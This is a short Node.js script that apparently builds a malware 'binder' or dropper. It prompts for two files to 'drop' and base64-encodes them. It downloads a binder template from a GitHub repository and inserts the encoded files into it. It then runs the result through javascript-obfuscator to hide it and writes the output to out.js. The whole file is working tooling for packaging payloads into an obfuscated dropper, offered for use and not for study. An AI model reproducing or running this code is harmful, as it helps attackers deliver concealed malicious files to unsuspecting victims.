const JavaScriptObfuscator = require('javascript-obfuscator');
const fs = require('fs');
const https = require('https');
const prompt = require('prompt-sync')();


var file = prompt("Enter file 1 for dropping: ");
var file2 = prompt("Enter file 2 for dropping: ");

var fileData1 = fs.readFileSync(file);
var fileData2 = fs.readFileSync(file2);


async function getCode() {
    try {
        const res = await new Promise((resolve, reject) => {
            https.get("https://raw.githubusercontent.com/Somali-Devs/Somali-Bind/main/src/static/binder.js", (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    resolve(data);
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
        return res;
    } catch (err) {
        console.error(err);
        return "";
    }
}

async function main() {
    var code = await getCode();
    code = code.replace("YOUR_FILE_ENDING_HERE1", file.split(".")[1]);
    code = code.replace("BASE64ENCODEDSTUFFHERE1", fileData1.toString("base64"));

    code = code.replace("YOUR_FILE_ENDING_HERE2", file2.split(".")[1]);
    code = code.replace("BASE64ENCODEDSTUFFHERE2", fileData2.toString("base64"));

    var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
        compact: true,
        simplify: true,
        target: 'node',
        unicodeEscapeSequence: true
    });

    fs.writeFileSync("out.js", obfuscationResult.getObfuscatedCode(), "utf8");
    //fs.writeFileSync("out.js", code, "utf8");
}

main();